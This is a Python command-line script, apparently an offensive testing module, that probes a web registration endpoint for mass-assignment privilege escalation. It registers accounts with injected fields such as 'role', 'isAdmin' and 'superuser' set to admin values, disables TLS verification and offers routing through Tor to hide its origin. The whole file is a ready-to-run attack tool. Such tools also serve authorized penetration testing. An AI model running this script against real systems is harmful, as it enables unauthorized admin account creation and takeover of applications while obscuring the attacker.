#!/usr/bin/env python3
import requests
import argparse
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Common privilege escalation fields to test
MASS_ASSIGNMENT_FIELDS = [
    "role",
    "isAdmin",
    "is_admin",
    "admin",
    "verified",
    "approved",
    "active",
    "superuser",
    "is_superuser",
    "privilege",
    "level",
    "rank",
    "permissions",
    "access",
]

ADMIN_VALUES = ["admin", "superuser", "true", "1", "True", True, 1]

def test_mass_assignment(url, endpoint, username, password, fields=None, proxies=None):
    """
    Attempts to register a user with elevated privilege fields injected
    into the registration payload. Checks if any are reflected back in
    the response, confirming mass assignment vulnerability.
    """
    s = requests.Session()
    headers = {"Content-Type": "application/json"}
    fields_to_test = fields if fields else MASS_ASSIGNMENT_FIELDS

    print(f"[*] Testing mass assignment on {url}{endpoint}")
    print(f"[*] Testing {len(fields_to_test)} privilege fields...\n")

    confirmed = []

    for field in fields_to_test:
        for value in ADMIN_VALUES:
            payload = {
                "username": username,
                "password": password,
                field: value
            }

            print(f"[*] Trying field: {field} = {value}")

            try:
                r = s.post(
                    f"{url}{endpoint}",
                    json=payload,
                    headers=headers,
                    verify=False,
                    proxies=proxies,
                    timeout=10
                )
            except requests.exceptions.RequestException as e:
                print(f"[!] Request error: {e}")
                continue

            print(f"    Status: {r.status_code}")

            # Check if the field is reflected in the response
            try:
                response_json = r.json()
                response_str = json.dumps(response_json)
            except Exception:
                response_str = r.text

            if field in response_str and str(value) in response_str:
                print(f"[+] CONFIRMED: Field '{field}' with value '{value}' reflected in response!")
                print(f"    Response: {r.text}\n")
                confirmed.append({"field": field, "value": value, "status": r.status_code, "response": r.text})
                break  # Move to next field once confirmed

            else:
                print(f"    [-] Field not reflected\n")

    if confirmed:
        print(f"[+] Mass assignment vulnerability confirmed on endpoint: {endpoint}")
        print(f"[+] Vulnerable fields: {[c['field'] for c in confirmed]}")
    else:
        print("[-] No mass assignment vulnerability detected")

    return confirmed

def save_results(confirmed, outfile):
    with open(outfile, "w") as f:
        for item in confirmed:
            f.write(f"Field: {item['field']} | Value: {item['value']} | Status: {item['status']}\n")
            f.write(f"Response: {item['response']}\n\n")
    print(f"[+] Results saved to {outfile}")

def main():
    parser = argparse.ArgumentParser(description="Mass Assignment Detection Module")
    parser.add_argument("url", help="Base URL of the target (e.g. http://target.com/)")
    parser.add_argument("endpoint", help="Registration or update endpoint (e.g. api/register)")
    parser.add_argument("username", help="Username to register")
    parser.add_argument("password", help="Password to register")
    parser.add_argument("--fields", nargs="+", help="Custom list of fields to test")
    parser.add_argument("--tor", action="store_true", help="Route traffic through Tor")
    parser.add_argument("--outfile", default=None, help="Save results to file")

    args = parser.parse_args()

    proxies = None
    if args.tor:
        print("[*] Routing traffic through Tor...")
        proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}

    confirmed = test_mass_assignment(
        args.url,
        args.endpoint,
        args.username,
        args.password,
        args.fields,
        proxies
    )

    if confirmed and args.outfile:
        save_results(confirmed, args.outfile)

if __name__ == "__main__":
    main()
